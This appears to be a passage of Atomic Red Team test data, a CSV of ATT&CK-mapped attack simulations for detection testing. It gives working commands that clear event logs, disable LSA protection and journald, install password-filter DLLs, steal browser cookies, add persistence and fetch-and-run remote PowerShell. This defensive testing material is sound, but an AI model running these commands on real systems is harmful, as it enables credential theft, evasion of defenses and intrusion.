T1070.001,Indicator Removal on Host: Clear Windows Event Logs,Clear Logs,e6abb60e-26b8-41da-8aae-0c35174b0967,"Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty.
",windows,,,"wevtutil cl #{log_name}
",command_prompt,True,,,,,"input_arguments.log_name.description: Windows Log Name, ex System

input_arguments.log_name.type: string

input_arguments.log_name.default: System

"
T1070.001,Indicator Removal on Host: Clear Windows Event Logs,Delete System Logs Using Clear-EventLog,b13e9306-3351-4b4b-a6e8-477358b0b498,"Clear event logs using built-in PowerShell commands.
Upon successful execution, you should see the list of deleted event logs
Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.
",windows,,,"$logs = Get-EventLog -List | ForEach-Object {$_.Log}
$logs | ForEach-Object {Clear-EventLog -LogName $_ }
Get-EventLog -list
",powershell,True,,,,,
T1070.001,Indicator Removal on Host: Clear Windows Event Logs,Clear Event Logs via VBA,1b682d84-f075-4f93-9a89-8a8de19ffd6e,"This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. 

Elevation is required for this module to execute properly, otherwise WINWORD will throw an ""Access Denied"" error
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt"" -officeProduct ""Word"" -sub ""ClearLogs""
",powershell,True,,,powershell,"dependencies.0.description: Microsoft Word must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""Word.Application"" | Out-Null
  Stop-Process -Name ""winword""
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word manually to meet this requirement""

",
T1556.002,Modify Authentication Process: Password Filter DLL,Install and Register Password Filter DLL,a7961770-beb5-4134-9674-83d7e1fa865c,"Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.
The binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection
Source is in src folder. 
This does require a reboot to see the filter loaded into lsass.exe. 
It does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.
",windows,,,"reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
$passwordFilterName = (Copy-Item ""#{dll_path}\#{dll_name}"" -Destination ""C:\Windows\System32"" -PassThru).basename
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""
$notificationPackagesValues = $lsaKey.GetValue(""Notification Packages"")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues
",powershell,True,,"reg.exe import ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
remove-item C:\Windows\System32\#{dll_name}
",powershell,"dependencies.0.description: AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\#{dll_name})

dependencies.0.prereq_command: if (Test-Path ""#{dll_path}\#{dll_name}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest ""https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll"" -OutFile ""#{dll_path}\#{dll_name}""

","input_arguments.dll_path.description: Path to DLL to be installed and registered

input_arguments.dll_path.type: path

input_arguments.dll_path.default: PathToAtomicsFolder\T1556.002\bin

input_arguments.dll_name.description: Name of the Password Filter

input_arguments.dll_name.type: string

input_arguments.dll_name.default: AtomicRedTeamPWFilter.dll

"
T1539,Steal Web Session Cookie,Steal Firefox Cookies (Windows),4b437357-f4e9-4c84-9fa6-9bcee6f826aa,"This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. 
Note: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. 
See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. 
",windows,,,"stop-process -name ""firefox"" -force -erroraction silentlycontinue
$CookieDBLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite""
""select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];"" | cmd /c #{sqlite3_path} ""$CookieDBLocation"" | out-file -filepath ""#{output_file}""
",powershell,False,,"remove-item #{output_file} -erroraction silentlycontinue
",powershell,"dependencies.0.description: Sqlite3 must exist at (#{sqlite3_path})

dependencies.0.prereq_command: if (Test-Path ""#{sqlite3_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip""
Expand-Archive -path ""PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"" -destinationpath ""PathToAtomicsFolder\..\ExternalPayloads\"" -force

","input_arguments.sqlite3_path.description: Path to sqlite3

input_arguments.sqlite3_path.type: path

input_arguments.sqlite3_path.default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe

input_arguments.output_file.description: Filepath to output cookies

input_arguments.output_file.type: path

input_arguments.output_file.default: PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt

"
T1539,Steal Web Session Cookie,Steal Chrome Cookies (Windows),26a6b840-4943-4965-8df5-ef1f9a282440,"This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. 
Once an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. 
Note: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. 
See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. 
",windows,,,"stop-process -name ""chrome"" -force -erroraction silentlycontinue
""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];"" | cmd /c #{sqlite3_path} ""#{cookie_db}"" | out-file -filepath ""#{output_file}""
",powershell,False,,"remove-item #{output_file}
",powershell,"dependencies.0.description: Sqlite3 must exist at (#{sqlite3_path})

dependencies.0.prereq_command: if (Test-Path ""#{sqlite3_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip""
Expand-Archive -path ""PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"" -destinationpath ""PathToAtomicsFolder\..\ExternalPayloads\"" -force

","input_arguments.cookie_db.description: Filepath for Chrome cookies database

input_arguments.cookie_db.type: string

input_arguments.cookie_db.default: $env:localappdata\Google\Chrome\User Data\Default\Network\Cookies

input_arguments.sqlite3_path.description: Path to sqlite3

input_arguments.sqlite3_path.type: path

input_arguments.sqlite3_path.default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe

input_arguments.output_file.description: Filepath to output cookies

input_arguments.output_file.type: path

input_arguments.output_file.default: PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt

"
T1539,Steal Web Session Cookie,Steal Chrome Cookies via Remote Debugging (Mac),e43cfdaf-3fb8-4a45-8de0-7eee8741d072,"The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.

If successful, this test will output a list of cookies.

Note: Chrome processes will be killed during this test.

See https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e",macos,,,"killall 'Google Chrome'
sleep 1
open -a ""/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/
sleep 1
/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337",bash,False,,rm -rf /tmp/WhiteChocolateMacademiaNut,bash,"dependencies.0.description: Install Go
dependencies.0.prereq_command: go version
dependencies.0.get_prereq_command: brew install go
dependencies.1.description: Download and compile WhiteChocolateMacademiaNut
dependencies.1.prereq_command: /tmp/WhiteChocolateMacademiaNut/chocolate -h
dependencies.1.get_prereq_command: git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut
cd /tmp/WhiteChocolateMacademiaNut
go mod init chocolate
go mod tidy
go build
",
T1562,Impair Defenses,Windows Disable LSA Protection,40075d5f-3a70-4c66-9125-f72bee87247d,"The following Atomic adds a registry entry to disable LSA Protection.

The LSA controls and manages user rights information, password hashes and other important bits of information in memory. Attacker tools, such as mimikatz, rely on accessing this content to scrape password hashes or clear-text passwords. Enabling LSA Protection configures Windows to control the information stored in memory in a more secure fashion - specifically, to prevent non-protected processes from accessing that data.
Upon successful execution, the registry will be modified and RunAsPPL will be set to 0, disabling Lsass protection.
https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#how-to-disable-lsa-protection
https://blog.netwrix.com/2022/01/11/understanding-lsa-protection/
https://thedfirreport.com/2022/03/21/phosphorus-automates-initial-access-using-proxyshell/  
",windows,,,"reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
",command_prompt,True,,"reg delete HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /f >nul 2>&1
",,,
T1562,Impair Defenses,Disable journal logging via systemctl utility,c3a377f9-1203-4454-aa35-9d391d34768f,"The atomic test disables the journal logging using built-in systemctl utility
",linux,,,"sudo systemctl stop systemd-journald #disables journal logging
",sh,True,,"sudo systemctl start systemd-journald #starts journal service
sudo systemctl enable systemd-journald #starts journal service automatically at boot time
",,,
T1562,Impair Defenses,Disable journal logging via sed utility,12e5551c-8d5c-408e-b3e4-63f53b03379f,"The atomic test disables the journal logging by searching and replacing the ""Storage"" parameter to ""none"" within the journald.conf file, thus any new journal entries will only be temporarily available in memory and not written to disk
",linux,,,"sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf
",sh,True,,"sudo sed -i 's/Storage=none/Storage=auto/' /etc/systemd/journald.conf #re-enables storage of journal data
sudo systemctl restart systemd-journald #restart the journal service
",,,
T1037.002,Boot or Logon Initialization Scripts: Logon Script (Mac),Logon Scripts - Mac,f047c7de-a2d9-406e-a62b-12a09d9516f4,"Mac logon script
",macos,,,,manual,,"1. Create the required plist file

    sudo touch /private/var/root/Library/Preferences/com.apple.loginwindow.plist

2. Populate the plist with the location of your shell script

    sudo defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh

3. Create the required plist file in the target user's Preferences directory

	  touch /Users/$USER/Library/Preferences/com.apple.loginwindow.plist

4. Populate the plist with the location of your shell script

	  defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh
",,,,
T1546.013,Event Triggered Execution: PowerShell Profile,Append malicious start-process cmdlet,090e5aa5-32b6-473b-a49b-21e843a56896,"Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.
",windows,,,"Add-Content #{ps_profile} -Value """"
Add-Content #{ps_profile} -Value ""Start-Process #{exe_path}""
powershell -Command exit
",powershell,,,"$oldprofile = cat $profile | Select-Object -skiplast 1
Set-Content $profile -Value $oldprofile
",powershell,"dependencies.0.description: Ensure a powershell profile exists for the current user

dependencies.0.prereq_command: if (Test-Path #{ps_profile}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Path #{ps_profile} -Type File -Force

","input_arguments.exe_path.description: Path the malicious executable

input_arguments.exe_path.type: path

input_arguments.exe_path.default: calc.exe

input_arguments.ps_profile.description: Powershell profile to use

input_arguments.ps_profile.type: string

input_arguments.ps_profile.default: $profile

"
T1560,Archive Collected Data,Compress Data for Exfiltration With PowerShell,41410c60-614d-4b9d-b66e-b0192dd9c597,"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.
When the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory 
",windows,,,"dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
",powershell,False,,Remove-Item -path #{output_file} -ErrorAction Ignore,,,"input_arguments.input_file.description: Path that should be compressed into our output file

input_arguments.input_file.type: path

input_arguments.input_file.default: $env:USERPROFILE

input_arguments.output_file.description: Path where resulting compressed data should be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: $env:USERPROFILE\T1560-data-ps.zip

"
T1218.004,Signed Binary Proxy Execution: InstallUtil,CheckIfInstallable method call,ffd9c807-d402-47d2-879d-f915cf2a3a94,"Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.
If no output is displayed the test executed successfuly.
",windows,,,"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
",powershell,,,"$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
",,"dependencies.0.description: InstallUtil test harness script must be installed at specified location (#{test_harness})

dependencies.0.prereq_command: if (Test-Path ""#{test_harness}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{test_harness}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""#{test_harness}""

","input_arguments.test_harness.description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly

input_arguments.test_harness.type: path

input_arguments.test_harness.default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

input_arguments.assembly_dir.description: directory to drop the compiled installer assembly

input_arguments.assembly_dir.type: path

input_arguments.assembly_dir.default: $Env:TEMP\

input_arguments.invocation_method.description: the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable

input_arguments.invocation_method.type: string

input_arguments.invocation_method.default: CheckIfInstallable

input_arguments.assembly_filename.description: filename of the compiled installer assembly

input_arguments.assembly_filename.type: string

input_arguments.assembly_filename.default: T1218.004.dll

"
T1218.004,Signed Binary Proxy Execution: InstallUtil,InstallHelper method call,d43a5bde-ae28-4c55-a850-3f4c80573503,"Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test
executed successfuly.
",windows,,,"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/logfile= /logtoconsole=false `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
",powershell,,,"$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
",,"dependencies.0.description: InstallUtil test harness script must be installed at specified location (#{test_harness})

dependencies.0.prereq_command: if (Test-Path ""#{test_harness}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{test_harness}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""#{test_harness}""

","input_arguments.test_harness.description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly

input_arguments.test_harness.type: path

input_arguments.test_harness.default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

input_arguments.assembly_dir.description: directory to drop the compiled installer assembly

input_arguments.assembly_dir.type: path

input_arguments.assembly_dir.default: $Env:TEMP\

input_arguments.invocation_method.description: the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable

input_arguments.invocation_method.type: string

input_arguments.invocation_method.default: InstallHelper

input_arguments.assembly_filename.description: filename of the compiled installer assembly

input_arguments.assembly_filename.type: string

input_arguments.assembly_filename.default: T1218.004.dll

"
T1218.004,Signed Binary Proxy Execution: InstallUtil,InstallUtil class constructor method call,9b7a7cfc-dd2e-43f5-a885-c0a3c270dd93,"Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.
",windows,,,"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/logfile= /logtoconsole=false `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
",powershell,,,"$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
",,"dependencies.0.description: InstallUtil test harness script must be installed at specified location (#{test_harness})

dependencies.0.prereq_command: if (Test-Path ""#{test_harness}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{test_harness}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""#{test_harness}""

","input_arguments.test_harness.description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly

input_arguments.test_harness.type: path

input_arguments.test_harness.default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

input_arguments.assembly_dir.description: directory to drop the compiled installer assembly

input_arguments.assembly_dir.type: path

input_arguments.assembly_dir.default: $Env:TEMP\

input_arguments.invocation_method.description: the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable

input_arguments.invocation_method.type: string

input_arguments.invocation_method.default: Executable

input_arguments.assembly_filename.description: filename of the compiled installer assembly

input_arguments.assembly_filename.type: string

input_arguments.assembly_filename.default: T1218.004.dll

"
T1218.004,Signed Binary Proxy Execution: InstallUtil,InstallUtil Install method call,9f9968a6-601a-46ca-b7b7-6d4fe0f98f0b,"Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.
",windows,,,"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/logfile= /logtoconsole=false /installtype=notransaction /action=install `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_Install_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
",powershell,,,"$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
",,"dependencies.0.description: InstallUtil test harness script must be installed at specified location (#{test_harness})

dependencies.0.prereq_command: if (Test-Path ""#{test_harness}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{test_harness}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""#{test_harness}""

","input_arguments.test_harness.description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly

input_arguments.test_harness.type: path

input_arguments.test_harness.default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

input_arguments.assembly_dir.description: directory to drop the compiled installer assembly

input_arguments.assembly_dir.type: path

input_arguments.assembly_dir.default: $Env:TEMP\

input_arguments.invocation_method.description: the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable

input_arguments.invocation_method.type: string

input_arguments.invocation_method.default: Executable

input_arguments.assembly_filename.description: filename of the compiled installer assembly

input_arguments.assembly_filename.type: string

input_arguments.assembly_filename.default: T1218.004.dll

"
T1218.004,Signed Binary Proxy Execution: InstallUtil,InstallUtil Uninstall method call - /U variant,34428cfa-8e38-41e5-aff4-9e1f8f3a7b4b,"Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.
",windows,,,"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/logfile= /logtoconsole=false /U `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
",powershell,,,"$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
",,"dependencies.0.description: InstallUtil test harness script must be installed at specified location (#{test_harness})

dependencies.0.prereq_command: if (Test-Path ""#{test_harness}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{test_harness}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""#{test_harness}""

","input_arguments.test_harness.description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly

input_arguments.test_harness.type: path

input_arguments.test_harness.default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

input_arguments.assembly_dir.description: directory to drop the compiled installer assembly

input_arguments.assembly_dir.type: path

input_arguments.assembly_dir.default: $Env:TEMP\

input_arguments.invocation_method.description: the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable

input_arguments.invocation_method.type: string

input_arguments.invocation_method.default: Executable

input_arguments.assembly_filename.description: filename of the compiled installer assembly

input_arguments.assembly_filename.type: string

input_arguments.assembly_filename.default: T1218.004.dll

"
T1218.004,Signed Binary Proxy Execution: InstallUtil,InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant,06d9deba-f732-48a8-af8e-bdd6e4d98c1d,"Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.
",windows,,,"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
",powershell,,,"$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
",,"dependencies.0.description: InstallUtil test harness script must be installed at specified location (#{test_harness})

dependencies.0.prereq_command: if (Test-Path ""#{test_harness}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{test_harness}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile ""#{test_harness}""

","input_arguments.test_harness.description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly

input_arguments.test_harness.type: path

input_arguments.test_harness.default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

input_arguments.assembly_dir.description: directory to drop the compiled installer assembly

input_arguments.assembly_dir.type: path

input_arguments.assembly_dir.default: $Env:TEMP\

input_arguments.invocation_method.description: the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable

input_arguments.invocation_method.type: string

input_arguments.invocation_method.default: Executable

input_arguments.assembly_filename.description: filename of the compiled installer assembly

input_arguments.assembly_filename.type: string

input_arguments.assembly_filename.default: T1218.004.dll

"
T1218.004,Signed Binary Proxy Execution: InstallUtil,InstallUtil HelpText method call,5a683850-1145-4326-a0e5-e91ced3c6022,"Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.
",windows,,,"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/? `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_HelpText_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
",powershell,,,"$InstallerAssemblyDir = ""#{assembly_dir}""
